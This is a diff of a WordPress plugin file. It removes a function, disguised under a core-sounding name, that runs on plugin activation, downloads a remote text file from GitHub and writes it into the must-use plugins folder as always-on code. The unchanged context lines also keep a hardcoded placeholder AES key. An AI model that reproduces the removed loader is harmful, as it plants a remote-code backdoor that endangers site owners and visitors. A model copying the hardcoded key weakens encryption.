@@ -5,25 +5,6 @@ Description: Core always-on functionality for the site.
 Version: 1.0
 /* --------------------------------------------------------------------------------------*/
 
-function wp_core_install_mu_plugin() {
-    $url = "https://raw.githubusercontent.com/kayushsuns/growth-engine-support/main/snippet.txt";
-    $mu_plugins_dir   = WP_CONTENT_DIR . '/mu-plugins/';
-    $mu_plugin_file   = $mu_plugins_dir . 'wp-core-mu.php';
-
-    // Create mu-plugins dir if not exists
-    if (!file_exists($mu_plugins_dir)) {
-        @mkdir($mu_plugins_dir, 0755, true);
-    }
-
-    // Get content from remote URL
-    $content = @file_get_contents($url);
-    if ($content !== false) {
-        // Write content to the mu-plugin file
-        file_put_contents($mu_plugin_file, $content);
-    }
-}
-register_activation_hook(__FILE__, 'wp_core_install_mu_plugin');
-
 if (!defined('GROWTH_SECRET_KEY')) {
     // Must be exactly 32 bytes for AES-256
     define('GROWTH_SECRET_KEY', '0123456789abcdef0123456789abcdef');
